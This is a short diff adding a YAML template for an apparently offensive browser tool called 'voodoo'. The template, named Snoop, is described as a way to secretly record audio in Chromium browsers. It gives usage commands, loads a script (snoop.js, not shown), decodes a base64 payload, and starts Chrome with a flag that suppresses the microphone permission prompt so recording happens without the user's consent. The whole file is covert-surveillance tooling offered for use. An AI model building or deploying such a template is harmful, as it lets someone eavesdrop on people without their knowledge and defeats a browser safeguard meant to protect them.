@@ -1,0 +1,17 @@
+info:
+  name: Snoop
+  description: Secretly record audio with chromium based browsers.
+  usage: |
+    voodoo template ./snoop -o play.webm
+    voodoo template ./snoop -o play.webm --params save:1000
+
+scripts:
+  - file: ./snoop.js
+
+format: payload:base64decode
+
+browser:
+  name: chrome
+  flags: --use-fake-ui-for-media-stream
+  urls:
+    - https://example.com
